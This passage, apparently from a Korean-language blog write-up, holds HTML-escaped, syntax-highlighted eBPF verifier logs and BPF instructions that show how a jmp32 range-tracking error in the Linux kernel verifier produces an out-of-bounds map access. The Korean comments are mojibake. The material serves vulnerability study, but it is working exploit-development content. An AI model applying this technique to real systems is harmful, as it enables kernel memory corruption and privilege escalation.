 &lt;span class=&quot;nx&quot;&gt;R0_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R6_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;umin_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4294967298&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R7_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv4294967297&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fp0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mmmm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;????&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// jmp32 oob (r6 range = [1, 1])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R0_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R6_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;umin_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;umax_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4294967297&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;var_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1ffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R7_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv4294967297&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fp0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mmmm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;????&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;w6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;R0_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R6_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;umin_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;umax_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4294967297&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;var_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R7_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv4294967297&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fp0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mmmm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;????&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// ì‹¤ì œ r6 = 2 ì—°ì‚°í›„ r2ëŠ” (r6&amp;amp;2) &amp;gt;&amp;gt; 1 == 1. í•˜ì§€ë§Œ ìœ„ì—ì„œ rangeë¥¼ [1, 1]ë¡œ ì¸ì‹í•´ì„œ (1&amp;amp;2) &amp;gt;&amp;gt; 1&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;umin_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;umax_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4294967297&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;var_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv4294967297&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fp0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mmmm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;????&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r9&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r10&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;r10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bpf_map_lookup_elem&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;R0_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R6_w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inv4294967297&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fp0&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mmmm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;????&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì‹¤ì œ r6ê°€ ë³€ì¡°ë˜ì–´ oobíŠ¸ë¦¬ê±°&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;272&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// í˜„ì¬ r6 = 1&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r9&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r10&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
